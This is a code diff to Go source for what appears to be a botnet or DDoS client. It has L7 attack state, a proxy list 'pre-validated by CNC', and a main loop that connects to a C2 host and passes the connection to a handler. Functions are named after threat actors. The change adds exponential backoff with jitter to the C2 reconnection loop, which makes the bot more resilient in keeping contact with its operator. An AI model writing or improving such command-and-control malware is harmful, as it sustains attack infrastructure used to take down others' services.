@@ -90,6 +90,7 @@ var (
 	aptStopMutex     sync.Mutex
 	aptAttackRunning bool
 
+
 	// Proxy support for L7 attacks (pre-validated by CNC)
 	proxyList      []string
 	proxyListMutex sync.RWMutex
@@ -308,15 +309,25 @@ func main() {
 	}
 	deoxys("main: C2 Host: %s, Port: %s", host, port)
 	deoxys("main: Entering main connection loop...")
+	backoff := retryFloor
+	maxBackoff := 60 * time.Second
 	for {
 		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
-			delay := retryFloor + time.Duration(rand.Int63n(int64(retryCeil-retryFloor)))
+			jitter := time.Duration(rand.Int63n(int64(backoff / 2)))
+			delay := backoff + jitter
 			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
 			time.Sleep(delay)
+			if backoff < maxBackoff {
+				backoff *= 2
+				if backoff > maxBackoff {
+					backoff = maxBackoff
+				}
+			}
 			continue
 		}
+		backoff = retryFloor // reset on successful connect
 		deoxys("main: Connected to C2, starting handler")
 		anonymousSudan(conn)
 		delay := retryFloor + time.Duration(rand.Int63n(int64(retryCeil-retryFloor)))
